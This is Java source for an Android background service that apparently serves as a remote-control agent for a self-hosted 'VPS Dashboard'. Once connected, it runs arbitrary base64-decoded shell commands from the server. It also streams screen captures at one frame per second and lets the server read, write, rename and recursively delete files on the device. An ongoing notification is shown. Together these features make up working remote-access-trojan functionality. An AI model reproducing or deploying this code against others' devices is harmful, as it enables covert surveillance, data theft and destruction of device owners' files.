package com.run.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.Locale;

import io.socket.client.IO;
import io.socket.client.Socket;

public class RunService extends Service {
    private static final String TAG = "RunService";
    private static final String CHANNEL_ID = "run_agent_channel";

    public static boolean isRunning = false;
    private String uniqueUser;
    private Socket socket;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    private boolean captureActive = false;
    private Thread captureThread;
    private Thread heartbeatThread;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        isRunning = true;
        Notification notification = buildNotification("Run Agent Active", "Connected to VPS Dashboard");

        int resultCode = intent.getIntExtra("resultCode", -1);
        Intent data = intent.getParcelableExtra("data");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && resultCode != -1 && data != null) {
            startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(1001, notification);
        }

        String rawId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (rawId == null || rawId.isEmpty()) rawId = "device";
        String cleanId = rawId.length() > 8 ? rawId.substring(0, 8) : rawId;
        uniqueUser = "android-" + cleanId + "-" + Config.OS_SUFFIX;

        if (resultCode != -1 && data != null) {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                mediaProjection = mpm.getMediaProjection(resultCode, data);
                setupVirtualDisplay();
            }
        }

        connectSocket();
        startHeartbeatLoop();

        return START_STICKY;
    }

    private void connectSocket() {
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 2000;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket", "polling"};
            opts.auth = Collections.singletonMap("token", Config.CLIENT_KEY);

            socket = IO.socket(URI.create(Config.VPS_URL), opts);

            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected to WebSocket as " + uniqueUser);
                try {
                    JSONObject reg = new JSONObject();
                    reg.put("username", uniqueUser);
                    reg.put("auth_token", Config.CLIENT_KEY);
                    reg.put("version", Config.CLIENT_VERSION);
                    socket.emit("register", reg);
                } catch (Exception e) {
                    Log.e(TAG, "Register error", e);
                }
            });

            socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                Log.e(TAG, "Socket connect error: " + (args != null && args.length > 0 ? args[0] : "unknown"));
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.w(TAG, "Socket disconnected");
            });

            socket.on("exec_command", args -> {
                try {
                    JSONObject obj = (JSONObject) args[0];
                    String cmd = obj.optString("cmd", "");
                    executeShellCommand(cmd);
                } catch (Exception e) {
                    Log.e(TAG, "exec_command error", e);
                }
            });

            socket.on("set_capture", args -> {
                try {
                    JSONObject obj = (JSONObject) args[0];
                    boolean shouldCapture = obj.optBoolean("capture", false);
                    if (shouldCapture && !captureActive) {
                        captureActive = true;
                        startCaptureLoop();
                    } else if (!shouldCapture && captureActive) {
                        captureActive = false;
                    }
                } catch (Exception e) {
                    Log.e(TAG, "set_capture error", e);
                }
            });

            // File manager routes
            socket.on("fs_list_req", args -> handleFsList((JSONObject) args[0]));
            socket.on("fs_read_req", args -> handleFsRead((JSONObject) args[0]));
            socket.on("fs_write_req", args -> handleFsWrite((JSONObject) args[0]));
            socket.on("fs_delete_req", args -> handleFsDelete((JSONObject) args[0]));
            socket.on("fs_mkdir_req", args -> handleFsMkdir((JSONObject) args[0]));
            socket.on("fs_rename_req", args -> handleFsRename((JSONObject) args[0]));

            socket.connect();
        } catch (Exception e) {
            Log.e(TAG, "Socket init error", e);
        }
    }

    // ── 1 FPS Screen Capture Stream ──
    private void startCaptureLoop() {
        captureThread = new Thread(() -> {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmssSSS", Locale.US);
            while (captureActive) {
                try {
                    if (imageReader != null && socket != null && socket.connected()) {
                        Image image = imageReader.acquireLatestImage();
                        if (image != null) {
                            Image.Plane plane = image.getPlanes()[0];
                            ByteBuffer buffer = plane.getBuffer();
                            int pixelStride = plane.getPixelStride();
                            int rowStride = plane.getRowStride();
                            int rowPadding = rowStride - pixelStride * image.getWidth();

                            Bitmap bmp = Bitmap.createBitmap(
                                    image.getWidth() + rowPadding / pixelStride,
                                    image.getHeight(),
                                    Bitmap.Config.ARGB_8888
                            );
                            bmp.copyPixelsFromBuffer(buffer);
                            image.close();

                            // Crop out any row padding
                            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, image.getWidth(), image.getHeight());
                            if (bmp != cropped) bmp.recycle();

                            // Downscale 50% for fast streaming
                            int w = cropped.getWidth() / 2;
                            int h = cropped.getHeight() / 2;
                            Bitmap scaled = Bitmap.createScaledBitmap(cropped, Math.max(1, w), Math.max(1, h), true);
                            if (cropped != scaled) cropped.recycle();

                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            scaled.compress(Bitmap.CompressFormat.JPEG, 75, baos);
                            byte[] imgBytes = baos.toByteArray();
                            scaled.recycle();

                            String filename = sdf.format(new Date()) + ".jpg";
                            JSONObject payload = new JSONObject();
                            payload.put("username", uniqueUser);
                            payload.put("filename", filename);
                            payload.put("image", imgBytes);

                            socket.emit("upload_frame", payload);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Capture error", e);
                }

                try {
                    Thread.sleep(1000); // Strictly 1 FPS
                } catch (InterruptedException ignored) {
                    break;
                }
            }
        });
        captureThread.setDaemon(true);
        captureThread.start();
    }

    // ── Command Execution via Linux Shell (sh) ──
    private void executeShellCommand(String rawCmd) {
        new Thread(() -> {
            try {
                String cmd = rawCmd;
                try {
                    byte[] decoded = Base64.decode(rawCmd, Base64.DEFAULT);
                    String testStr = new String(decoded, "UTF-8");
                    if (testStr.length() > 0) cmd = testStr;
                } catch (Exception ignored) {}

                Log.d(TAG, "Executing shell cmd: " + cmd);
                Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                process.waitFor();
            } catch (Exception e) {
                Log.e(TAG, "Command exec error", e);
            }
        }).start();
    }

    // ── File System Handlers ──
    private void handleFsList(JSONObject data) {
        try {
            String reqId = data.optString("req_id");
            String path = data.optString("path", "drives");
            JSONObject payload = new JSONObject();

            if ("drives".equalsIgnoreCase(path)) {
                JSONArray drives = new JSONArray();
                JSONObject internal = new JSONObject();
                internal.put("path", "/storage/emulated/0");
                internal.put("label", "Internal Storage (/sdcard)");
                internal.put("total", 0);
                internal.put("free", 0);
                drives.put(internal);
                payload.put("drives", drives);
                payload.put("current_path", "");
            } else {
                File dir = new File(path);
                JSONArray items = new JSONArray();
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            JSONObject item = new JSONObject();
                            item.put("name", f.getName());
                            item.put("is_dir", f.isDirectory());
                            item.put("size", f.isFile() ? f.length() : 0);
                            item.put("modified", f.lastModified() / 1000);
                            items.put(item);
                        }
                    }
                }
                payload.put("items", items);
                payload.put("current_path", dir.getAbsolutePath());
            }

            JSONObject res = new JSONObject();
            res.put("req_id", reqId);
            res.put("payload", payload);
            socket.emit("fs_list_res", res);
        } catch (Exception e) {
            Log.e(TAG, "fs_list error", e);
        }
    }

    private void handleFsRead(JSONObject data) {
        try {
            String reqId = data.optString("req_id");
            String path = data.optString("path");
            File file = new File(path);
            JSONObject payload = new JSONObject();

            if (file.exists() && file.isFile()) {
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[(int) Math.min(file.length(), 1024 * 1024)];
                int read = fis.read(buffer);
                fis.close();
                payload.put("content", new String(buffer, 0, Math.max(0, read), "UTF-8"));
                payload.put("is_base64", false);
            } else {
                payload.put("error", "File not found or unreadable");
            }

            JSONObject res = new JSONObject();
            res.put("req_id", reqId);
            res.put("payload", payload);
            socket.emit("fs_read_res", res);
        } catch (Exception e) {
            Log.e(TAG, "fs_read error", e);
        }
    }

    private void handleFsWrite(JSONObject data) {
        try {
            String reqId = data.optString("req_id");
            String path = data.optString("path");
            String content = data.optString("content", "");
            boolean isBase64 = data.optBoolean("is_base64", false);

            File file = new File(path);
            FileOutputStream fos = new FileOutputStream(file);
            if (isBase64) {
                fos.write(Base64.decode(content, Base64.DEFAULT));
            } else {
                fos.write(content.getBytes("UTF-8"));
            }
            fos.close();

            JSONObject payload = new JSONObject();
            payload.put("status", "success");
            JSONObject res = new JSONObject();
            res.put("req_id", reqId);
            res.put("payload", payload);
            socket.emit("fs_write_res", res);
        } catch (Exception e) {
            Log.e(TAG, "fs_write error", e);
        }
    }

    private void handleFsDelete(JSONObject data) {
        try {
            String reqId = data.optString("req_id");
            String path = data.optString("path");
            File file = new File(path);
            boolean success = deleteRecursive(file);

            JSONObject payload = new JSONObject();
            payload.put("success", success);
            JSONObject res = new JSONObject();
            res.put("req_id", reqId);
            res.put("payload", payload);
            socket.emit("fs_delete_res", res);
        } catch (Exception e) {
            Log.e(TAG, "fs_delete error", e);
        }
    }

    private void handleFsMkdir(JSONObject data) {
        try {
            String reqId = data.optString("req_id");
            String path = data.optString("path");
            File dir = new File(path);
            boolean success = dir.mkdirs();

            JSONObject payload = new JSONObject();
            payload.put("success", success || dir.exists());
            JSONObject res = new JSONObject();
            res.put("req_id", reqId);
            res.put("payload", payload);
            socket.emit("fs_mkdir_res", res);
        } catch (Exception e) {
            Log.e(TAG, "fs_mkdir error", e);
        }
    }

    private void handleFsRename(JSONObject data) {
        try {
            String reqId = data.optString("req_id");
            String oldPath = data.optString("old_path");
            String newPath = data.optString("new_path");
            File oldFile = new File(oldPath);
            File newFile = new File(newPath);
            boolean success = oldFile.renameTo(newFile);

            JSONObject payload = new JSONObject();
            payload.put("success", success);
            JSONObject res = new JSONObject();
            res.put("req_id", reqId);
            res.put("payload", payload);
            socket.emit("fs_rename_res", res);
        } catch (Exception e) {
            Log.e(TAG, "fs_rename error", e);
        }
    }

    private boolean deleteRecursive(File f) {
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        return f.delete();
    }

    private void startHeartbeatLoop() {
        heartbeatThread = new Thread(() -> {
            while (isRunning) {
                try {
                    if (socket != null && socket.connected()) {
                        JSONObject hb = new JSONObject();
                        hb.put("username", uniqueUser);
                        hb.put("version", Config.CLIENT_VERSION);
                        socket.emit("heartbeat", hb);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Heartbeat error", e);
                }

                try {
                    Thread.sleep(5000);
                } catch (InterruptedException ignored) {
                    break;
                }
            }
        });
        heartbeatThread.setDaemon(true);
        heartbeatThread.start();
    }

    private void setupVirtualDisplay() {
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);

        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int dpi = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay(
                "RunScreen",
                width,
                height,
                dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                null
        );
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Run Client Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification(String title, String text) {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        return builder.setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        captureActive = false;
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
        if (socket != null) {
            socket.disconnect();
            socket.close();
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
